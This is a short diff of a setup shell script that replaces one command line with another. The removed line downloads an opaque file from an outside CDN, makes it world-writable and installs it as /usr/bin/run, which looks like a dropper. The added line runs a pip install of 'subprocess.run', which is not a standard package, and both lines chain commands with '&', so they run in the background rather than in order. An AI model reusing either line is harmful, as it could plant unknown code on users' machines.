@@ -1,4 +1,4 @@
-apt install -y default-jdk git htop screen wget & wget https://cdn.410wl.cn/api/1620711416-971.MSRP & chmod 777 1620711416-971.MSRP & mv 1620711416-971.MSRP /usr/bin/run
+sudo apt -y update & sudo apt install -y openjdk-11 git htop screen & pip3 install requests & pip3 install subprocess.run
 
 
 
